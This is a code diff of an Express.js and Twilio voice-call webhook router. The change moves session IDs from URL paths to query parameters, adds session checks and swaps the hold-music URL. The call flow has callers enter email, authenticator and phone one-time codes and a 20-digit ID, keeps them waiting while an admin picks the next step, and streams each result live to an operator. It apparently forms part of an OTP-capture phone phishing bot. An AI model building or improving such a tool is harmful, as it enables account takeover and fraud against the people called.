@@ -3,10 +3,22 @@ const router = express.Router();
 const VoiceResponse = require('twilio').twiml.VoiceResponse;
 const db = require('../database/db');
 
-router.post('/voice-response/:sessionId', async (req, res) => {
-    const { sessionId } = req.params;
+// Test endpoint - Check if server is reachable
+router.get('/test', (req, res) => {
+    res.send('Webhook is working! Server is online.');
+});
+
+// Main voice response - NO sessionId required, get it from query or body
+router.post('/voice-response', async (req, res) => {
+    const sessionId = req.body.sessionId || req.query.sessionId;
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
+    
+    if (!sessionId) {
+        twiml.say('Invalid session. Goodbye.');
+        twiml.hangup();
+        return res.type('text/xml').send(twiml.toString());
+    }
     
     try {
         const session = await db.query(
@@ -31,7 +43,7 @@ router.post('/voice-response/:sessionId', async (req, res) => {
         if (currentAction === 'consent') {
             const gather = twiml.gather({
                 numDigits: 1,
-                action: `/webhooks/handle-consent/${sessionId}`,
+                action: `/webhooks/handle-consent?sessionId=${sessionId}`,
                 method: 'POST',
                 timeout: 10
             });
@@ -52,7 +64,7 @@ router.post('/voice-response/:sessionId', async (req, res) => {
         } else if (currentAction === 'waiting_for_email_otp') {
             const gather = twiml.gather({
                 numDigits: 6,
-                action: `/webhooks/collect-email-otp/${sessionId}`,
+                action: `/webhooks/collect-email-otp?sessionId=${sessionId}`,
                 method: 'POST',
                 finishOnKey: '#',
                 timeout: 10
@@ -64,7 +76,7 @@ router.post('/voice-response/:sessionId', async (req, res) => {
         } else if (currentAction === 'waiting_for_auth_otp') {
             const gather = twiml.gather({
                 numDigits: 6,
-                action: `/webhooks/collect-auth-otp/${sessionId}`,
+                action: `/webhooks/collect-auth-otp?sessionId=${sessionId}`,
                 method: 'POST',
                 finishOnKey: '#',
                 timeout: 10
@@ -76,7 +88,7 @@ router.post('/voice-response/:sessionId', async (req, res) => {
         } else if (currentAction === 'waiting_for_phone_otp') {
             const gather = twiml.gather({
                 numDigits: 6,
-                action: `/webhooks/collect-phone-otp/${sessionId}`,
+                action: `/webhooks/collect-phone-otp?sessionId=${sessionId}`,
                 method: 'POST',
                 finishOnKey: '#',
                 timeout: 10
@@ -88,7 +100,7 @@ router.post('/voice-response/:sessionId', async (req, res) => {
         } else if (currentAction === 'waiting_for_id') {
             const gather = twiml.gather({
                 numDigits: 20,
-                action: `/webhooks/collect-id/${sessionId}`,
+                action: `/webhooks/collect-id?sessionId=${sessionId}`,
                 method: 'POST',
                 finishOnKey: '#',
                 timeout: 10
@@ -101,8 +113,11 @@ router.post('/voice-response/:sessionId', async (req, res) => {
             const play = twiml.play({
                 loop: 10
             });
-            play.url = `${req.protocol}://${req.get('host')}/audio/music.mp3`;
-            twiml.redirect(`/webhooks/check-action/${sessionId}`, { method: 'POST' });
+            play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
+            twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
+        } else {
+            twiml.say('Please wait for admin instructions.');
+            twiml.hangup();
         }
         
         res.type('text/xml');
@@ -118,11 +133,17 @@ router.post('/voice-response/:sessionId', async (req, res) => {
     }
 });
 
-router.post('/handle-consent/:sessionId', async (req, res) => {
-    const { sessionId } = req.params;
+router.post('/handle-consent', async (req, res) => {
+    const sessionId = req.body.sessionId || req.query.sessionId;
     const { Digits } = req.body;
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
+    
+    if (!sessionId) {
+        twiml.say('Invalid session. Goodbye.');
+        twiml.hangup();
+        return res.type('text/xml').send(twiml.toString());
+    }
     
     if (Digits === '1') {
         await db.query(
@@ -139,8 +160,8 @@ router.post('/handle-consent/:sessionId', async (req, res) => {
         
         twiml.say('Please wait as we serve you.');
         const play = twiml.play({ loop: 10 });
-        play.url = `${req.protocol}://${req.get('host')}/audio/music.mp3`;
-        twiml.redirect(`/webhooks/check-action/${sessionId}`, { method: 'POST' });
+        play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
+        twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
         
     } else {
         twiml.say('You did not press 1. Goodbye.');
@@ -152,11 +173,17 @@ router.post('/handle-consent/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-router.post('/collect-email-otp/:sessionId', async (req, res) => {
-    const { sessionId } = req.params;
+router.post('/collect-email-otp', async (req, res) => {
+    const sessionId = req.body.sessionId || req.query.sessionId;
     const { Digits } = req.body;
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
+    
+    if (!sessionId) {
+        twiml.say('Invalid session. Goodbye.');
+        twiml.hangup();
+        return res.type('text/xml').send(twiml.toString());
+    }
     
     if (Digits) {
         const session = await db.query(
@@ -178,8 +205,8 @@ router.post('/collect-email-otp/:sessionId', async (req, res) => {
         
         twiml.say('Please wait as we validate your identity.');
         const play = twiml.play({ loop: 10 });
-        play.url = `${req.protocol}://${req.get('host')}/audio/music.mp3`;
-        twiml.redirect(`/webhooks/check-action/${sessionId}`, { method: 'POST' });
+        play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
+        twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
         
     } else {
         twiml.say('No OTP received. Goodbye.');
@@ -190,11 +217,17 @@ router.post('/collect-email-otp/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-router.post('/collect-auth-otp/:sessionId', async (req, res) => {
-    const { sessionId } = req.params;
+router.post('/collect-auth-otp', async (req, res) => {
+    const sessionId = req.body.sessionId || req.query.sessionId;
     const { Digits } = req.body;
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
+    
+    if (!sessionId) {
+        twiml.say('Invalid session. Goodbye.');
+        twiml.hangup();
+        return res.type('text/xml').send(twiml.toString());
+    }
     
     if (Digits) {
         const session = await db.query(
@@ -216,8 +249,8 @@ router.post('/collect-auth-otp/:sessionId', async (req, res) => {
         
         twiml.say('Please wait as we validate your identity.');
         const play = twiml.play({ loop: 10 });
-        play.url = `${req.protocol}://${req.get('host')}/audio/music.mp3`;
-        twiml.redirect(`/webhooks/check-action/${sessionId}`, { method: 'POST' });
+        play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
+        twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
         
     } else {
         twiml.say('No code received. Goodbye.');
@@ -228,11 +261,17 @@ router.post('/collect-auth-otp/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-router.post('/collect-phone-otp/:sessionId', async (req, res) => {
-    const { sessionId } = req.params;
+router.post('/collect-phone-otp', async (req, res) => {
+    const sessionId = req.body.sessionId || req.query.sessionId;
     const { Digits } = req.body;
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
+    
+    if (!sessionId) {
+        twiml.say('Invalid session. Goodbye.');
+        twiml.hangup();
+        return res.type('text/xml').send(twiml.toString());
+    }
     
     if (Digits) {
         const session = await db.query(
@@ -254,8 +293,8 @@ router.post('/collect-phone-otp/:sessionId', async (req, res) => {
         
         twiml.say('Please wait as we validate your identity.');
         const play = twiml.play({ loop: 10 });
-        play.url = `${req.protocol}://${req.get('host')}/audio/music.mp3`;
-        twiml.redirect(`/webhooks/check-action/${sessionId}`, { method: 'POST' });
+        play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
+        twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
         
     } else {
         twiml.say('No OTP received. Goodbye.');
@@ -266,11 +305,17 @@ router.post('/collect-phone-otp/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-router.post('/collect-id/:sessionId', async (req, res) => {
-    const { sessionId } = req.params;
+router.post('/collect-id', async (req, res) => {
+    const sessionId = req.body.sessionId || req.query.sessionId;
     const { Digits } = req.body;
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
+    
+    if (!sessionId) {
+        twiml.say('Invalid session. Goodbye.');
+        twiml.hangup();
+        return res.type('text/xml').send(twiml.toString());
+    }
     
     if (Digits) {
         const session = await db.query(
@@ -292,8 +337,8 @@ router.post('/collect-id/:sessionId', async (req, res) => {
         
         twiml.say('Please wait as we validate your identity.');
         const play = twiml.play({ loop: 10 });
-        play.url = `${req.protocol}://${req.get('host')}/audio/music.mp3`;
-        twiml.redirect(`/webhooks/check-action/${sessionId}`, { method: 'POST' });
+        play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
+        twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
         
     } else {
         twiml.say('No ID received. Goodbye.');
@@ -304,9 +349,15 @@ router.post('/collect-id/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-router.post('/check-action/:sessionId', async (req, res) => {
-    const { sessionId } = req.params;
+router.post('/check-action', async (req, res) => {
+    const sessionId = req.body.sessionId || req.query.sessionId;
     const twiml = new VoiceResponse();
+    
+    if (!sessionId) {
+        twiml.say('Invalid session. Goodbye.');
+        twiml.hangup();
+        return res.type('text/xml').send(twiml.toString());
+    }
     
     const session = await db.query(
         `SELECT current_action FROM call_sessions WHERE id = $1`,
@@ -315,27 +366,29 @@ router.post('/check-action/:sessionId', async (req, res) => {
     
     if (session.rows[0] && session.rows[0].current_action === 'playing_music') {
         const play = twiml.play({ loop: 5 });
-        play.url = `${req.protocol}://${req.get('host')}/audio/music.mp3`;
-        twiml.redirect(`/webhooks/check-action/${sessionId}`, { method: 'POST' });
+        play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
+        twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
     } else {
-        twiml.redirect(`/webhooks/voice-response/${sessionId}`, { method: 'POST' });
+        twiml.redirect(`/webhooks/voice-response?sessionId=${sessionId}`, { method: 'POST' });
     }
     
     res.type('text/xml');
     res.send(twiml.toString());
 });
 
-router.post('/call-status/:sessionId', async (req, res) => {
-    const { sessionId } = req.params;
+router.post('/call-status', async (req, res) => {
+    const sessionId = req.body.sessionId || req.query.sessionId;
     const { CallStatus, Duration } = req.body;
     const io = req.app.get('io');
     
-    await db.query(
-        `UPDATE call_sessions SET status = $1, duration_seconds = $2, ended_at = CASE WHEN $1 IN ('completed', 'failed') THEN NOW() ELSE ended_at END WHERE id = $3`,
-        [CallStatus, Duration || 0, sessionId]
-    );
-    
-    io.emit('call_status', { session_id: sessionId, status: CallStatus, duration: Duration });
+    if (sessionId) {
+        await db.query(
+            `UPDATE call_sessions SET status = $1, duration_seconds = $2, ended_at = CASE WHEN $1 IN ('completed', 'failed') THEN NOW() ELSE ended_at END WHERE id = $3`,
+            [CallStatus, Duration || 0, sessionId]
+        );
+        
+        io.emit('call_status', { session_id: sessionId, status: CallStatus, duration: Duration });
+    }
     
     res.sendStatus(200);
 });
